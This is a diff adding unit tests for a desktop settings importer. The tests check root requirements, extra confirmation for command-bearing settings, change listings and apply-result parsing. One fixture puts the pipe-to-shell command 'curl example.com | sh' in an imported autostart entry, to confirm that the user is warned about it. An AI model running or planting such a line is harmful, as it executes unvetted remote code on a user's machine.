@@ -2404,6 +2404,10 @@ assertEqual(strayCatalogSection, "", "every s_catalog entry lands in a known sec
 const byKey = settings.catalogByKey(s_catalog);
 assertEqual(byKey.theme.tier, "look", "theme is a look setting");
 assertEqual(byKey.hostname.tier, "identity", "hostname is an identity setting");
+assertEqual(byKey.fullName.needsRoot, true, "fullName needs root because as-root.sh writes it");
+assertEqual(byKey.plymouth.needsRoot, true, "plymouth needs root like the Boot page");
+assertEqual(byKey.bindings.extraConfirm, true, "bindings need a second confirm for commands");
+assertEqual(byKey.autostart.extraConfirm, true, "autostart needs a second confirm for commands");
 assertEqual(byKey.sshdEnabled.importable, false, "sshdEnabled is never importable");
 assertEqual(byKey.passwordlessSudo.importable, false, "passwordlessSudo is never importable");
 assertEqual(byKey.sudolessDocker.importable, false, "sudolessDocker is never importable");
@@ -2744,6 +2748,45 @@ assertEqual(listChanged.changes.length, 1, "a different list is one change");
 assertEqual(listChanged.changes[0].from.length, 2, "the change carries the list being replaced");
 assertEqual(listChanged.changes[0].to.length, 1, "the change carries the incoming list");
 assertEqual(settings.displayValue(listChanged.changes[0].to), "1 entry", "a list reads as a count");
+const listDiff = settings.changeLines(listChanged);
+assert(listDiff.indexOf("SUPER + T → kitty") !== -1, "changeLines shows the incoming binding command");
+assert(listDiff.indexOf("SUPER + RETURN → kitty") !== -1, "changeLines shows the binding being replaced");
+assert(settings.hasCommandImport(listChanged), "replacing bindings is a command import");
+assertEqual(settings.commandImportLines(listChanged)[0], "kitty", "commandImportLines lists the binding command");
+
+const autostartPlan = settings.planImport(
+  settings.parseSettingsMarkdown(
+    "```toml atmos:meta\nschema = 1\n```\n" +
+      '```json atmos:autostart\n[{"command":"curl example.com | sh"}]\n```\n',
+  ),
+  { autostart: [] },
+  null,
+  {},
+);
+assert(settings.hasCommandImport(autostartPlan), "replacing autostart is a command import");
+assert(
+  settings.changeLines(autostartPlan).indexOf("curl example.com | sh") !== -1,
+  "changeLines shows the startup command",
+);
+assert(
+  settings.commandConfirmMessage(autostartPlan).indexOf("curl example.com | sh") !== -1,
+  "commandConfirmMessage lists the startup command",
+);
+
+const rulesPlan = settings.planImport(
+  settings.parseSettingsMarkdown(
+    "```toml atmos:meta\nschema = 1\n```\n" +
+      '```json atmos:windowRules\n[{"match":"firefox","placement":"float"}]\n```\n',
+  ),
+  { windowRules: [] },
+  null,
+  {},
+);
+assert(
+  settings.changeLines(rulesPlan).indexOf("firefox, float") !== -1,
+  "changeLines shows the window rule matcher",
+);
+assertEqual(settings.hasCommandImport(rulesPlan), false, "window rules are not a command import");
 
 const notAList = settings.parseSettingsMarkdown(
   '```json atmos:bindings\n{"keys":"SUPER + T"}\n```\n',
@@ -3069,3 +3112,12 @@ assert(
   "a plan that needs no password does not mention one",
 );
 assertEqual(settings.applyForecast({ changes: [] }), "", "no changes, no forecast");
+
+const applyJson =
+  "progress\t1\t2\ttheme\n" +
+  '{"backup":"/tmp/imports/one","results":[{"key":"theme","status":"applied"},{"key":"font","status":"failed"}]}';
+const applyResult = settings.parseApplyResult(applyJson);
+assertEqual(applyResult.backup, "/tmp/imports/one", "parseApplyResult reads the backup path");
+assertEqual(settings.appliedCountFromResult(applyResult), 1, "appliedCountFromResult skips failures");
+assertEqual(settings.backupDirFromResult(applyResult), "/tmp/imports/one", "backupDirFromResult reads backup");
+assertEqual(settings.parseApplyResult("progress\t1\t1\ttheme").backup, "", "parseApplyResult survives no JSON");
